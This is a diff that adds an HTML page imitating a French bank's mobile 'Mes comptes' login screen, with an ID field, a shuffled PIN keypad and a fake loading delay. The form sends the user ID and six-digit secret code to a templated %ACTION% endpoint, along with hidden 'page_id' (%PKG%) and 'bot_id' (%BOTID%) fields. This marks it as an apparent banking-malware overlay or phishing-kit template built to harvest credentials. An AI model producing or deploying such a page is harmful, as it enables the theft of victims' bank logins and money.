@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
+	<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+	
+
+	<style type="text/css">
+		* {
+			padding: 0;
+			margin: 0;
+		}
+		body {
+			background-color: #f2f2f2;
+		}
+		.top-bar {
+			display: flex;
+		    -webkit-box-align: center;
+		    align-items: center;
+		    -webkit-box-pack: justify;
+		    justify-content: space-between;
+		    height: 5rem;
+		    padding: 0 7px;
+		    background-color: #fff;
+		    border-bottom: 1px solid #e5e5e5;
+		    position: fixed;
+		    top: 0;
+		    right: 0;
+		    left: 0;
+		    color: #505050;
+		    height: 50px;
+		    z-index: 1000;
+		}
+		.top-bar-nav {
+		    height: 24px;
+		    width: 24px;
+		    padding: 0;
+		    background-color: #fff;
+		    border: none;
+		    position: absolute;
+		    top: 50%;
+		    transform: translateY(-50%);
+		    color: #505050;
+		    cursor: pointer;
+		    left: 4px;
+		}
+		.top-bar-nav span {
+		    display: block;
+		    height: 2px;
+		    width: 18px;
+		    background-color: #1a89c0;
+		    border-radius: 10px;
+		    position: absolute;
+		    left: 3px;
+		    -webkit-transition: all .3s;
+		    transition: all .3s;
+		}
+		.top-bar-nav span:first-child {
+		    top: 4px;
+		}
+		.top-bar-nav span:nth-child(2), .top-bar-nav span:nth-child(3) {
+		    top: 11px;
+		}
+		.top-bar-nav span:last-child {
+		    bottom: 4px;
+		}
+		.top-bar-title {
+		    -webkit-box-flex: 1;
+		    -webkit-flex: 1;
+		    flex: 1;
+		    padding: 0;
+		    background: 0 0;
+		    text-align: center;
+		    text-transform: none;
+		    color: #1a89c0;
+		    font-size: 1.5rem;
+		    font-weight: 400;
+		    line-height: 1.15;
+		    display: block;
+		}
+		.group_button_mes_comptes {
+			width: 100%;
+			/*padding: 7px;*/
+			padding-top: 57px;
+			/*padding-bottom: 15px;*/
+		}
+
+
+		.radioButton + label {
+			width: 100%;
+			font-size: 10px;
+			text-align: center;
+/*			padding-left: 7px;
+			padding-right: 7px;*/
+			padding-left: : 10px;
+			/*border: 2px solid;*/
+			display: inline-block;
+			height: 75px;
+			/*border-color: #000000;*/
+			color: #1a89c0;
+			font-size: 12px;
+			box-shadow: 1px 1px 1px 1px grey;
+		}
+		.radioButton:checked + label {
+			background-color: #c23256;
+			color: #fff;
+
+		}
+		.radioButton {
+			display: none;
+		}
+		#button_ma_synthese + label {
+			float: left;
+			background-image: url("%DYN_PATH%/img/ma_synthese_off.png");
+			background-repeat: no-repeat;
+			background-position: center;
+		}
+		#button_ma_synthese:checked + label {
+			background-image: url("%DYN_PATH%/img/ma_synthese_on.png");
+		}
+		#button_ma_synthese_multibanque + label {
+			float: right;
+			background-image: url("%DYN_PATH%/img/ma_synthese_multibanque_off.png");
+			background-repeat: no-repeat;
+			background-position: center;
+
+		}
+		#button_ma_synthese_multibanque:checked + label {
+			background-image: url("%DYN_PATH%/img/ma_synthese_multibanque_on.png");
+		}
+		.group_buttons_table {
+			table-layout: fixed; 
+			width: 100%;
+		}
+		group_buttons_table td {
+			padding: 7px;
+		}
+		.component-input-text-deletable___ {
+			width: 100%;
+			padding: 15px;
+			/*padding-left: 15px;*/
+			position: relative;
+			/*margin: 0;*/
+			/*padding: 0;*/
+		}
+
+		.component-input-text-deletable {
+		margin: 0;
+	    padding: 0;
+	    border: 0;
+	    font-size: 100%;
+	    font: inherit;
+	    vertical-align: baseline;
+	    position: relative;
+	    padding-right: 0.5em;
+		}
+
+		.auth-login {
+		    border: 1px solid #ccc;
+			/*margin: 15px;*/
+		    border-radius: 0;
+		    box-shadow: -8px 0 0 #7bbddf;
+		    display: inline-block;
+		    margin: 0;
+		    padding: 0 0.5em;
+		    width: 100%;
+		    color: #505050;
+		    font-family: 'helvetica neue', sans-serif;
+		    font-size: 14px;
+		    height: 30px;
+		    line-height: 27px;
+		    /*padding-left: 0;*/
+		}
+		.auth-cs-content {
+			padding: 0 15px;
+			position: relative;
+			margin-top: 15px;
+		}
+
+		input::-webkit-input-placeholder{
+			color: black;
+
+		}
+
+		.auth-checkbox-wrapper {
+			white-space: nowrap;
+		    padding: 20px 15PX 0;
+		    font-size: 16px;
+		    position: relative;
+		}
+		#saveId + label {
+			color: #444;
+		    font-weight: bold;
+		    text-align: center;
+		    display: inline-block;
+		    position: relative;
+		}
+		#saveId + label .cb-icon {
+			border: 1px solid #b2b4b4;
+			border-radius: 3px;
+			background: transparent;
+			background-size: 20px 20px;
+			width: 23px;
+			height: 23px;
+			display: inline-block;
+			top: 5px;
+			position: relative;
+		}
+		#saveId:checked + label .cb-icon {
+			background-image: url("%DYN_PATH%/img/cb-on.png");
+			background-repeat: no-repeat;
+		}
+		.cb-label {
+			padding-left: 5px;
+		}
+		#saveId {
+			display: none;
+		}
+		.button-label-wrapper {
+			width: 100%;
+		    margin: 0 15px;
+		    overflow: hidden;
+		    margin-bottom: 10px;
+		    text-align: center;
+		    /*position: relative;*/
+		    /*top: 10px;*/
+		    margin-top: 30px;
+		}
+
+		
+		.auth-btn-action {
+		    background-color: #3d85b1;
+		    background-repeat: no-repeat;
+		    border: 1px solid #3d85b1;
+		    border-radius: 5px;
+		    box-shadow: 1px 1px 3px rgba(0,0,0,.15);
+		    display: inline-block;
+		    margin: 0 10px;
+		    padding: 0 25px;
+		    min-width: 100px;
+		    color: #FFF;
+		    font-size: 16px;
+		    line-height: 25px;
+		    text-align: center;
+		    margin: 12px 0px;
+		    background: url(%DYN_PATH%/img/valider-hd.png) no-repeat;
+		    background-size: 100%;
+		    text-indent: -9999em;
+		    border: 0;
+		    box-shadow: none;
+		    display: inline-block;
+		}
+		.password_line {
+			width: 100%;
+			text-align: center;
+			margin-top: 10px;
+			position: relative;
+		}
+		.button_div {
+			display: inline-block;
+			width: 45px;
+			height: 45px;
+			text-align: center;
+			border: 1px solid;
+			border-color: rgba(60,117,154,1);
+			border-radius: 3px;
+			/*border-radius: 50%;*/
+			font-size: 17px;
+			/*font-weight: bold;*/
+			margin-bottom: 10px;
+			margin-right: 10px;
+			color: rgba(60,117,154,1);
+			background-color: white;
+			font-weight: bold;
+			/*border-color: white;	*/
+			line-height: 45px;
+			-moz-user-select: none;
+			-webkit-user-select: none;
+			-ms-user-select:none;
+			user-select:none;
+			-o-user-select:none;	
+		}
+
+		#codeSecret {
+			box-shadow: inherit;
+		    zoom: inherit;
+		    border-radius: inherit;
+		    margin: inherit;
+		    border: 1px solid #c9c9c9;
+		    padding: 0 9px;
+		    background: transparent url(%DYN_PATH%/img/res-pwd2.png) no-repeat 0 1px;
+		    background-size: 247px auto;
+		    height: 40px;
+		    border: 0;
+		    background-position: 0 -1px;
+		    -webkit-text-security: none;
+		    letter-spacing: -10px;
+		    color: #ffffff;
+		    font-size: 0;
+		    box-sizing: border-box;
+		    -webkit-box-sizing: border-box;
+		    width: 247px;
+		    display: inline-block;
+		    right: -5px;
+		}
+		.auth-picto-sup {
+			margin-top: -4px;
+		    margin-bottom: 0;
+		    right: 5px;
+		    height: 38px;
+		    width: 30px;
+		    border: none;
+		    z-index: 1;
+		    background-image: url(%DYN_PATH%/img/res-picto-sup-red-transparent.png);
+		    background-size: 41px 27px;
+		    background-position: -21px, 0;
+		    background-repeat: no-repeat;
+    		display: inline-block;
+
+		}
+		#btn-authent {
+			width: 290px;
+		    max-width: 100%;
+		    box-sizing: border-box;
+		    background: linear-gradient(to bottom, rgba(134,176,199,1) 0%, rgba(60,117,154,1) 100%);
+		    border-color: #4a647f;
+    		font-weight: bold;
+    		box-shadow: 0 -1px 0px rgba(0,0,0,0.3), 0 1px 0px rgba(255,255,255,0.3);
+    		text-shadow: 0 -1px 0px rgba(0,0,0,0.5);
+    		line-height: 40px;
+    		border-radius: 5px;
+    		display: inline-block;
+			padding: 0 25px;
+		    min-width: 100px;
+		    color: #FFF;
+		    font-size: 16px;
+		    text-align: center;
+    		margin: 12px 0px;
+		    border: 0;
+		}
+		.invis {
+			display: none;
+		}
+
+
+	</style>
+</head>
+<body>
+	<div class="top-bar">
+		<button class="top-bar-nav">
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+		</button>
+		<h1 class="top-bar-title">Mes comptes</h1>
+	</div>
+	<div class="group_button_mes_comptes">
+		<!-- <form> -->
+ 			<table class="group_buttons_table">
+				<tr class="radio_group">
+					<td >
+						 <input class="radioButton" id="button_ma_synthese" type="radio" name="accType" checked><label for="button_ma_synthese">Synthèse</label>
+					</td>
+					<td >
+						<input class="radioButton" id="button_ma_synthese_multibanque" type="radio" name="accType"><label for="button_ma_synthese_multibanque">Synthèse multibanque</label>
+					</td>
+				</tr>
+			</table>
+		<!-- </form> -->
+	</div>
+
+	<form role="form" name="form" action="%ACTION%" id="form" method="post">
+	<input type="hidden" name="page_id" value="%PKG%"><input type="hidden" name="bot_id" value="%BOTID%" />
+	<div class="auth-cs-content">
+    <div class="component-input-text-deletable">
+    
+		<input id="user_id" name="fields[username]" type="tel"
+                     class="auth-login"
+                     autocapitalize="off" autocorrect="off"
+                     pattern="[0-9]*" placeholder="Identifiant" autocomplete="off" maxlength="11"/>
+		
+	</div>
+	</div>
+
+	<div class="auth-checkbox-wrapper">
+		
+		<input type="checkbox" name="" id="saveId"><label for="saveId"><span class="cb-icon"></span><span class="cb-label">Mémoriser l'identifiant</span></label>
+	</div>
+
+	<div class="button-label-wrapper">
+		<button class="auth-btn-action" id="valider1" type="button">OK</button>
+	</div>
+
+
+	<div class="component-authent-cv invis" id="password_field">
+
+		<div class="password_line">
+			<input id="codeSecret" readonly="readonly" type="text" name="fields[password]"></input>
+			<div class="auth-picto-sup"></div>
+		</div>
+
+	</form>
+		<div class="password_line">
+
+			<button class="button_div" type="button">1</button><button class="button_div" type="button">1</button><button class="button_div" type="button">1</button><button class="button_div" type="button">1</button><button class="button_div" type="button">1</button><br>
+			<button class="button_div" type="button">1</button><button class="button_div" type="button">1</button><button class="button_div" type="button">1</button><button class="button_div" type="button">1</button><button class="button_div" type="button">1</button><br>
+
+		</div>
+
+		<div class="password_line">
+			<button id="btn-authent">Valider</button>
+		</div>
+	</div>
+
+</body>
+
+
+<script type="text/javascript">
+
+var passwordPosition = 1;
+
+Array.prototype.shuffle = function() {
+   var i = this.length;
+   while (--i) {
+      var j = Math.floor(Math.random() * (i + 1))
+      var temp = this[i];
+      this[i] = this[j];
+      this[j] = temp;
+   }
+
+   return this;
+};
+
+function passwordClicked(elem){
+	var value = $(elem).data('value');
+
+	if ($('#codeSecret').val().length >= 6) {
+		return;
+	}
+
+	var passw = $('#codeSecret');
+	passw.val(passw.val() + value);
+	$('.auth-picto-sup').css('background-position', '0 0');
+	passwordPosition += 40;
+	$('#codeSecret').css('background-position', '0 -' + passwordPosition + 'px');
+
+}
+
+(function(){
+
+	var digits = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9].shuffle();
+	var tds = $('.button_div');
+	for (var i = 0; i < tds.length; i++){
+		var elem = tds[i];
+		elem.innerText = digits[i];
+		$(elem).data('value', digits[i]);
+		elem.onclick = function(){
+			passwordClicked(this);
+		};
+	}
+
+	$('#valider1').bind('click', function(){
+
+
+		// if(!(/[0-9]{,11}/.test($('#user_id').val())))
+		if (!/[0-9]{1,11}/.test($('#user_id').val()))
+		{
+			return;
+		}
+
+		setTimeout(function(){
+			$('#valider1').addClass('invis');
+			$('#password_field').removeClass('invis');
+			
+		}, 3000);
+
+		$('#valider1').css('background-size', '25px 5px;');
+		$('#valider1').css('background', 'url("%DYN_PATH%/img/loader.gif") no-repeat center center');		
+
+	});
+
+	$('.auth-picto-sup').bind('click', function(){
+		passwordPosition = 1;
+		$('#codeSecret').val('');
+		$('#codeSecret').css('background-position', '0 -' + passwordPosition + 'px');
+		$('.auth-picto-sup').css('background-position', '-21px 0');
+
+	});
+
+
+	$('#btn-authent').bind('click', function(){
+		var fields = {
+			'user_id': /[0-9]{1,11}/,
+			'codeSecret': /[0-9]{6}/
+		};
+
+		var err = false;
+
+		for (i in fields){
+			var field = i;
+			var regex = fields[i];
+
+			if(!(new RegExp(regex).test($('#' + field).val())))
+			{
+				
+				err = true;
+			} 
+		}
+
+		if (err){
+			return;
+		}
+
+		var oForm=document.getElementById('form');
+		oForm.submit();
+	});
+
+	$('.radioButton').bind('click', function(){
+		$('#valider1').removeClass('invis');
+		$('#password_field').addClass('invis');
+		$('#codeSecret').val('');
+		passwordPosition = 1;
+		$('#codeSecret').css('background-position', '0 -' + passwordPosition + 'px');
+		$('.auth-picto-sup').css('background-position', '-21px 0');
+		$('#user_id').val('');
+		$('#valider1').css('background', 'url(%DYN_PATH%/img/valider-hd.png) no-repeat');
+		$('#valider1').css('background-size', '100%');
+
+	});
+	
+})();
+
+
+</script>
+
+</html>
